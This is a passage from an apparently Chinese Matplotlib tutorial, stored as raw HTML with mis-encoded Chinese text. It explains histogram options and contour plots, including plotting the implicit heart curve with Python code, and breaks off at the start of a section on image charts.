data = [<span class="hljs-number">1.1</span>, <span class="hljs-number">1.3</span>, <span class="hljs-number">1.6</span>, <span class="hljs-number">2.6</span>, <span class="hljs-number">2.2</span>, <span class="hljs-number">3.1</span>, <span class="hljs-number">3.4</span>, <span class="hljs-number">3.2</span>, <span class="hljs-number">3.9</span>, <span class="hljs-number">3.5</span>,
        <span class="hljs-number">4.3</span>, <span class="hljs-number">5.1</span>, <span class="hljs-number">5.7</span>, <span class="hljs-number">5.8</span>, <span class="hljs-number">5.3</span>, <span class="hljs-number">5.1</span>, <span class="hljs-number">5.4</span>, <span class="hljs-number">5.6</span>, <span class="hljs-number">5.1</span>, <span class="hljs-number">5.0</span>, <span class="hljs-number">5.4</span>, <span class="hljs-number">5.6</span>, <span class="hljs-number">5.3</span>]

<span class="hljs-comment"># ä½¿ç”¨ hist å‡½æ•°ç»˜åˆ¶ç›´æ–¹å›¾</span>
ax.hist(
    data,                     <span class="hljs-comment"># è¾“å…¥æ•°æ®ï¼ˆä¸€ç»´æ•°ç»„æˆ–åºåˆ—ï¼‰</span>
    bins=[<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>], <span class="hljs-comment"># æŒ‡å®šåˆ†ç®±è¾¹ç•Œï¼šä¾æ¬¡ä¸º [1,2)ã€[2,3)ã€[3,4)ã€[4,5)ã€[5,6]</span>
    <span class="hljs-built_in">range</span>=(<span class="hljs-number">1</span>, <span class="hljs-number">5</span>),            <span class="hljs-comment"># ä»…ç»Ÿè®¡è½åœ¨ range èŒƒå›´å†…çš„æ•°æ®ï¼ˆæ­¤å¤„ä¸º 1 åˆ° 5ï¼‰ï¼ŒèŒƒå›´å¤–çš„æ•°æ®å°†è¢«å¿½ç•¥</span>
    histtype=<span class="hljs-string">"stepfilled"</span>,   <span class="hljs-comment"># ç›´æ–¹å›¾ç±»å‹ï¼šå¡«å……å¼é˜¶æ¢¯å›¾</span>
    orientation=<span class="hljs-string">"vertical"</span>,  <span class="hljs-comment"># æ–¹å‘ï¼šå‚ç›´ï¼ˆå¯é€‰ 'horizontal' ä¸ºæ°´å¹³ï¼‰</span>
    rwidth=<span class="hljs-number">0.9</span>,              <span class="hljs-comment"># æ¡å½¢ç›¸å¯¹å®½åº¦ï¼ˆå  bin å®½åº¦çš„æ¯”ä¾‹ï¼‰</span>
    color=<span class="hljs-string">"#277098"</span>,         <span class="hljs-comment"># å¡«å……é¢œè‰²</span>
    edgecolor=<span class="hljs-string">"black"</span>,       <span class="hljs-comment"># è¾¹æ¡†é¢œè‰²</span>
    alpha=<span class="hljs-number">0.75</span>,              <span class="hljs-comment"># å¡«å……ä¸é€æ˜åº¦</span>
    label=<span class="hljs-string">"æ™®é€šç›´æ–¹å›¾"</span>,      <span class="hljs-comment"># å›¾ä¾‹æ ‡ç­¾</span>
)

plt.show()
</code></pre>
<p>ä»£ç æ‰§è¡Œç»“æœå¦‚å›¾23æ‰€ç¤ºã€‚</p>
<p><code>histtype</code>å¯é€‰å‚æ•°æœ‰ï¼š<code>bar</code> - æŸ±çŠ¶å›¾ï¼Œ<code>step</code> - é˜¶æ¢¯çŠ¶å›¾ï¼Œ<code>stepfilled</code> - é˜¶æ¢¯çŠ¶å›¾å¹¶å¡«å……é¢œè‰²ï¼Œ<code>barstacked</code> - å¤šæ•°æ®å †å æ¡å½¢å›¾ã€‚ï¼ˆå½“é€‰ä¸ºé˜¶æ¢¯çŠ¶å›¾æ—¶ï¼Œ<code>rwidth</code>å‚æ•°æ— æ•ˆï¼‰</p>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6c6e485e92884592bd8f5e629917013e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTmFycmFzdG9yeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770769621&amp;x-signature=PF0%2FezYvcJ2FZW%2FPJP%2FBXI6EBqg%3D" alt="c18.jpg" width="100%" loading="lazy"/></p>
<p>é€šè¿‡è¿™ä¸ªä¾‹å­ï¼Œä½ å¯ä»¥çœ‹åˆ° <code>hist()</code> å‡½æ•°æä¾›äº†ä¸°å¯Œçš„å‚æ•°æ¥è‡ªå®šä¹‰ç›´æ–¹å›¾çš„è§†è§‰æ•ˆæœã€‚å»ºè®®ä½ å°è¯•ä¿®æ”¹å„ä¸ªå‚æ•°ï¼ˆä¾‹å¦‚ <code>histtype</code>ã€<code>color</code>ã€<code>rwidth</code> ç­‰ï¼‰ï¼Œè§‚å¯Ÿå›¾å½¢çš„å˜åŒ–ï¼Œè¿™å¯¹åŠ æ·±ç†è§£éå¸¸æœ‰å¸®åŠ©ã€‚å¦‚æœæœ‰å“ªäº›å‚æ•°è‡ªå·±å®åœ¨ä¸èƒ½ç†è§£ï¼Œå®Œå…¨å¯ä»¥æ±‚åŠ©AIï¼ŒåŠ ä¹‹è‡ªå·±çš„å®è·µï¼Œç†è§£å¹¶ä¸”è¿ç”¨å®ƒå®¾ä¸æ˜¯ä»€ä¹ˆéš¾äº‹ã€‚</p>
<p>ä¸Šé¢çš„ç¤ºä¾‹æ•°æ®é‡è¾ƒå°ï¼Œåœ¨å®é™…åˆ†æä¸­æˆ‘ä»¬å¸¸é¢å¯¹æˆåƒä¸Šä¸‡çš„æ•°æ®ç‚¹ã€‚æ­¤æ—¶ï¼Œç›´æ–¹å›¾èƒ½æ›´æ¸…æ™°åœ°æ­ç¤ºæ•°æ®çš„æ•´ä½“åˆ†å¸ƒè§„å¾‹ã€‚ä¸‹é¢çš„ä¾‹å­ç”Ÿæˆäº†ä¸€ä¸ªåŒ…å« 2000 ä¸ªæ•°æ®ç‚¹çš„åˆæˆæ•°æ®é›†ï¼Œå®ƒç”±ä¸¤ä¸ªä¸åŒçš„æ­£æ€åˆ†å¸ƒæ··åˆè€Œæˆï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># ç”Ÿæˆæ··åˆæ­£æ€åˆ†å¸ƒæ•°æ®</span>
<span class="hljs-keyword">import</span> random
<span class="hljs-comment"># ç”Ÿæˆå‡å€¼ä¸º 1ã€æ ‡å‡†å·®ä¸º 3 çš„æ­£æ€åˆ†å¸ƒæ ·æœ¬</span>
random_array_1 = [random.gauss(<span class="hljs-number">1</span>, <span class="hljs-number">3</span>) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1000</span>)]
<span class="hljs-comment"># ç”Ÿæˆå‡å€¼ä¸º 12ã€æ ‡å‡†å·®ä¸º 4 çš„æ­£æ€åˆ†å¸ƒæ ·æœ¬</span>
random_array_2 = [random.gauss(<span class="hljs-number">12</span>, <span class="hljs-number">4</span>) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1000</span>)]
<span class="hljs-comment"># åˆå¹¶ä¸¤ç»„æ•°æ®</span>
random_array = random_array_1 + random_array_2

fig, ax = plt.subplots(figsize=(<span class="hljs-number">6</span>, <span class="hljs-number">4</span>))
ax.hist(
    random_array,
    bins=<span class="hljs-number">50</span>,           <span class="hljs-comment"># æŒ‡å®šç›´æ–¹å›¾æŸ±å­çš„æ•°é‡ï¼ˆæ­¤å¤„ä¸º 50 æ ¹ï¼‰ï¼Œç³»ç»Ÿä¼šè‡ªåŠ¨å‡åŒ€åˆ’åˆ†åŒºé—´</span>
    <span class="hljs-built_in">range</span>=(-<span class="hljs-number">10</span>, <span class="hljs-number">25</span>),   <span class="hljs-comment"># ä»…æ˜¾ç¤º -10 åˆ° 25 èŒƒå›´å†…çš„æ•°æ®</span>
    histtype=<span class="hljs-string">"stepfilled"</span>,
    orientation=<span class="hljs-string">"vertical"</span>,
    rwidth=<span class="hljs-number">0.9</span>,
    color=<span class="hljs-string">"#FFFFFF"</span>,   <span class="hljs-comment"># ç™½è‰²å¡«å……</span>
    edgecolor=<span class="hljs-string">"black"</span>,
    alpha=<span class="hljs-number">0.75</span>,
    label=<span class="hljs-string">"åŒå³°åˆ†å¸ƒç›´æ–¹å›¾"</span>,
    hatch=<span class="hljs-string">'///'</span>,       <span class="hljs-comment"># å¡«å……å›¾æ¡ˆï¼ˆå‚è§ç¬¬å››ç« æ¡å½¢å›¾ç›¸å…³è¯´æ˜ï¼‰</span>
)

plt.show()
</code></pre>
<p>è¯¥ç¨‹åºçš„è¿è¡Œç»“æœå¦‚å›¾24æ‰€ç¤ºã€‚</p>
<h3 data-id="heading-15">ä¸ƒ. ç­‰é«˜çº¿å›¾</h3>
<p>ç­‰é«˜çº¿å›¾å¤§å®¶åº”è¯¥ä¸é™Œç”Ÿï¼Œåœ¨åˆé«˜ä¸­åœ°ç†è¯¾æœ¬ä¸Šç»å¸¸è§åˆ°â€”â€”å®ƒç”¨ä¸€åœˆåœˆçš„é—­åˆæ›²çº¿è¡¨ç¤ºåœ°å½¢çš„èµ·ä¼ï¼ŒåŒä¸€æ›²çº¿ä¸Šçš„æµ·æ‹”é«˜åº¦ç›¸åŒã€‚</p>
<p>åœ¨æ•°å­¦ä¸Šï¼Œç­‰é«˜çº¿å›¾å…¶å®æ˜¯<strong>ä¸‰ç»´å‡½æ•°åœ¨äºŒç»´å¹³é¢ä¸Šçš„æŠ•å½±</strong>ã€‚ç»™å®šä¸€ä¸ªäºŒå…ƒå‡½æ•° <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>z</mi><mo>=</mo><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">z = f(x,y)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal" style="margin-right:0.04398em;">z</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">)</span></span></span></span></span>ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi><mi>y</mi></mrow><annotation encoding="application/x-tex">xy</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord mathnormal">x</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span></span></span></span></span> å¹³é¢ä¸Šç”»å‡ºæ‰€æœ‰æ»¡è¶³ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo stretchy="false">)</mo><mo>=</mo><mi>c</mi></mrow><annotation encoding="application/x-tex">f(x,y)=c</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal">c</span></span></span></span></span> ï¼ˆ<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi></mrow><annotation encoding="application/x-tex">c</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal">c</span></span></span></span></span> ä¸ºå¸¸æ•°ï¼‰çš„æ›²çº¿ï¼Œæ¯ä¸€æ¡æ›²çº¿å°±ç§°ä¸ºä¸€æ¡â€œç­‰é«˜çº¿â€ã€‚å¤šæ¡ç­‰é«˜çº¿ç»„åˆåœ¨ä¸€èµ·ï¼Œå°±èƒ½ç›´è§‚åæ˜ å‡ºå‡½æ•°å€¼çš„å˜åŒ–è¶‹åŠ¿ï¼Œå¦‚å›¾25æ‰€ç¤ºã€‚</p>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c4ece7b94e504ba983d2daf158c1202a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTmFycmFzdG9yeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770769621&amp;x-signature=BRkNN1za1K%2BTQEkBsAh7YRhyGIs%3D" alt="c19.jpg" width="100%" loading="lazy"/></p>
<p>ç­‰é«˜çº¿å›¾åœ¨æ—¥å¸¸ç»˜å›¾ä¸­ä½¿ç”¨é¢‘ç‡ä¸ç®—é«˜ï¼Œå› æ­¤æœ¬æ•™ç¨‹ä¸å±•å¼€è¯¦è¿°ï¼ˆæœ‰äº†å‰é¢çš„åŸºç¡€ï¼Œå¦‚æœä½ éœ€è¦æ·±å…¥å­¦ä¹ ï¼Œå®Œå…¨å¯ä»¥å€ŸåŠ© AI å¿«é€ŸæŒæ¡ï¼‰ã€‚ä¸è¿‡ï¼Œç­‰é«˜çº¿å›¾æœ‰ä¸€ä¸ªéå¸¸é‡è¦çš„åº”ç”¨ï¼š<strong>ç»˜åˆ¶éšå‡½æ•°å›¾åƒ</strong>ã€‚</p>
<p>æ¯”å¦‚ä¸‹é¢è¿™ä¸ªéšå‡½æ•°æ–¹ç¨‹ï¼š</p>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mo stretchy="false">(</mo><msup><mi>x</mi><mn>2</mn></msup><mo>+</mo><msup><mi>y</mi><mn>2</mn></msup><mo>âˆ’</mo><mn>1</mn><msup><mo stretchy="false">)</mo><mn>3</mn></msup><mo>=</mo><msup><mi>x</mi><mn>2</mn></msup><msup><mi>y</mi><mn>3</mn></msup></mrow><annotation encoding="application/x-tex">(x^2+y^2-1)^3=x^2y^3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.1141em;vertical-align:-0.25em;"/><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:1.0585em;vertical-align:-0.1944em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:1.1141em;vertical-align:-0.25em;"/><span class="mord">1</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1.0585em;vertical-align:-0.1944em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span></span></span></span></span></div>
<p>å®ƒå¯¹åº”çš„æ›²çº¿æ˜¯ä¸€ä¸ªå¿ƒå½¢ï¼Œå¾ˆéš¾ç›´æ¥ç”¨ <code>plot()</code> ç”»å‡ºï¼Œå› ä¸ºä½ æ— æ³•ä»ä¸­è§£å‡º <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>y</mi><mo>=</mo><mi>g</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">y=g(x)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span></span></span></span></span> çš„æ˜¾å¼è¡¨è¾¾å¼ã€‚è¿™æ—¶å€™ï¼Œå°±éœ€è¦ç­‰é«˜çº¿å›¾äº†ã€‚</p>
<p>ç»˜åˆ¶éšå‡½æ•°çš„æœ¬è´¨å°±å°±æ˜¯å°†æ–¹ç¨‹æ”¹å†™ä¸º <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo stretchy="false">)</mo><mo>=</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">f(x,y) = 0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">0</span></span></span></span></span> çš„å½¢å¼ï¼Œå³ï¼š</p>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo stretchy="false">)</mo><mo>=</mo><mo stretchy="false">(</mo><msup><mi>x</mi><mn>2</mn></msup><mo>+</mo><msup><mi>y</mi><mn>2</mn></msup><mo>âˆ’</mo><mn>1</mn><msup><mo stretchy="false">)</mo><mn>3</mn></msup><mo>âˆ’</mo><msup><mi>x</mi><mn>2</mn></msup><msup><mi>y</mi><mn>3</mn></msup></mrow><annotation encoding="application/x-tex">f(x,y) = (x^2+y^2-1)^3 - x^2y^3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1.1141em;vertical-align:-0.25em;"/><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:1.0585em;vertical-align:-0.1944em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:1.1141em;vertical-align:-0.25em;"/><span class="mord">1</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:1.0585em;vertical-align:-0.1944em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span></span></span></span></span></div>
<p>ç„¶åç»˜åˆ¶ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">f(x,y)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">)</span></span></span></span></span> çš„å€¼ä¸º 0 çš„é‚£æ¡ç­‰é«˜çº¿ï¼Œè¿™æ¡çº¿å°±æ˜¯åŸæ–¹ç¨‹çš„è§£æ›²çº¿ã€‚</p>
<p>å¦‚ä¸‹æ˜¯ç»˜åˆ¶ä»£ç ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># ç»˜åˆ¶ç­‰é«˜çº¿é€šå¸¸éœ€è¦ç”Ÿæˆç½‘æ ¼æ•°æ®ï¼Œnumpyèƒ½æå¤§ç®€åŒ–è¿™ä¸€è¿‡ç¨‹ï¼Œå¦‚æœæ²¡æœ‰numpyçš„è¯ä»£ç å°†ä¼šéå¸¸ç¹çã€‚</span>
<span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np
x = np.linspace(-<span class="hljs-number">1.5</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">300</span>)  <span class="hljs-comment"># xèŒƒå›´ï¼š-1.5åˆ°1.5ï¼Œå–300ä¸ªç‚¹ï¼Œç‚¹è¶Šå¤šç»˜åˆ¶çš„å›¾å°±è¶Šç»†è‡´</span>
y = np.linspace(-<span class="hljs-number">1.5</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">300</span>)  <span class="hljs-comment"># yèŒƒå›´ï¼š-1.5åˆ°1.5</span>
X, Y = np.meshgrid(x, y)  		 <span class="hljs-comment"># ç”Ÿæˆç½‘æ ¼åæ ‡çŸ©é˜µ X, Y</span>

<span class="hljs-comment"># è®¡ç®—å‡½æ•° f(x, y) = (x^2 + y^2 - 1)^3 - x^2 * y^3</span>
F = (X**<span class="hljs-number">2</span> + Y**<span class="hljs-number">2</span> - <span class="hljs-number">1</span>)**<span class="hljs-number">3</span> - X**<span class="hljs-number">2</span> * Y**<span class="hljs-number">3</span>  

<span class="hljs-comment"># åˆ›å»ºå›¾å½¢</span>
fig, ax = plt.subplots(figsize=(<span class="hljs-number">6</span>, <span class="hljs-number">4</span>))

<span class="hljs-comment"># contourå‡½æ•°æ¥ç»˜åˆ¶ F=0 çš„ç­‰é«˜çº¿ï¼Œä¹Ÿå°±æ˜¯æ–¹ç¨‹çš„è§£</span>
<span class="hljs-comment"># levels=[0] è¡¨ç¤ºåªç”»å€¼ä¸º0çš„ç­‰é«˜çº¿</span>
ax.contour(X, Y, F, levels=[<span class="hljs-number">0</span>], colors=<span class="hljs-string">"red"</span>, linewidths=<span class="hljs-number">2</span>,alpha=<span class="hljs-number">0.7</span>)

ax.set_title(<span class="hljs-string">"Closed Curve: $(x^2+y^2-1)^3=x^2y^3$"</span>, fontsize=<span class="hljs-number">11</span>)
ax.grid(<span class="hljs-literal">True</span>, linestyle=<span class="hljs-string">"--"</span>, alpha=<span class="hljs-number">0.7</span>)
ax.axis(<span class="hljs-string">"equal"</span>)   <span class="hljs-comment"># é‡è¦ï¼ä¿è¯ xã€y è½´æ¯”ä¾‹ç›¸åŒï¼Œå›¾å½¢ä¸ä¼šæ‹‰ä¼¸å˜å½¢</span>

plt.show()
</code></pre>
<p>ä»£ç è¿è¡Œç»“æœå¦‚å›¾26æ‰€ç¤ºã€‚</p>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d6499eb1b2c747d7a9c4633f27ac19ab~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTmFycmFzdG9yeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770769621&amp;x-signature=6g2tnrcBYO2ho8Etu3MfRfI7Ado%3D" alt="c20.jpg" width="50%" loading="lazy"/></p>
<h3 data-id="heading-16">å…«. å›¾åƒç±»å›¾è¡¨</h3>
<p>å›¾åƒç±»å›¾è¡¨å…è®¸ä½ ç›´æ¥é€šè¿‡åƒç´ æ•°æ®ç»˜åˆ¶å›¾åƒï¼Œä¹Ÿå¯ä»¥è¯»å–å›¾ç‰‡å¹¶å°†å…¶ç»˜åˆ¶åˆ°å›¾è¡¨ä¸­å……å½“èƒŒæ™¯ï¼Œå›¾åƒç±»å›¾è¡¨çš„åº”ç”¨éå¸¸å¤šï¼Œéå¸¸çµæ´»ã€‚å½“ Matplotlib æ²¡æœ‰æä¾›ä½ æƒ³è¦çš„å›¾è¡¨ç±»å‹æ—¶ï¼Œä½ å®Œå…¨å¯ä»¥åŸºäºå›¾åƒåŠŸèƒ½â€œåˆ›é€ â€ä¸€ä¸ªã€‚è€Œä¸”å®ƒéå¸¸ç®€å•æ˜“å­¦ï¼Œæ ¸å¿ƒå‡½æ•°å‚æ•°ä¸å¤šï¼Œä¸Šæ‰‹è¿…é€Ÿã€‚</p>
<p>å¦‚ä¸‹ä»£ç å±•ç¤ºäº†å¦‚ä½•ä½¿ç”¨ä»£ç åˆ›å»ºä¸€ä¸ªç®€å•çš„å•é€šé“å›¾åƒå¹¶ä¸”æ˜¾ç¤ºå‡ºæ¥ï¼šï¼ˆâ€œé€šé“â€æ˜¯æ•°å­—å›¾åƒå¤„ç†ä¸­çš„åŸºæœ¬æ¦‚å¿µï¼Œå®ƒä»£è¡¨å›¾åƒä¸­ä¸€ç§åŸºæœ¬çš„é¢œè‰²æˆ–äº®åº¦ä¿¡æ¯ã€‚å¦‚æœä½ ä¸çŸ¥é“ä»€ä¹ˆæ˜¯â€œé€šé“â€ï¼Œé‚£ä¹ˆä½ å¯ä»¥å…ˆè‡ªè¡Œæœç´¢äº†è§£ä¸€ä¸‹ï¼‰</p>
<pre><code class="hljs language-python" lang="python">fig, ax = plt.subplots(figsize=(<span class="hljs-number">6</span>, <span class="hljs-number">4</span>))

<span class="hljs-comment"># åˆ›å»ºä¸€ä¸ªç°åº¦å›¾åƒï¼Œæ¯ä¸ªæ•°å­—å°±ä»£è¡¨ä¸€ä¸ªé¢œè‰²</span>
